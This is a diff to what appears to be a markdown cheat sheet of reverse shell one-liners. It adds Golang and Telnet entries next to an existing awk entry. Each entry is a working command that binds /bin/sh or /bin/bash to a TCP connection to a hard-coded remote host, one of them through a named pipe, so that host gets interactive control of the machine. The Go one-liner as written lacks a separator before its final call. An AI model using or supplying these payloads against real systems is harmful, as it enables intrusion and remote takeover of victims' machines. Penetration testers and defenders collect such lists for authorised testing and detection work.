@@ -128,6 +128,20 @@
   ```cmd
   awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
   ```
+ 
+ `Golang`
+
+  ```cmd
+  echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+  ```
+   `Telnet`
+
+  ```cmd
+  rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 443 0/tmp/p
+  ```
+  ```
+  telnet 192.168.1.2 80 | /bin/bash | telnet 192.168.1.2 443
+  ```
   
   `Java`
 
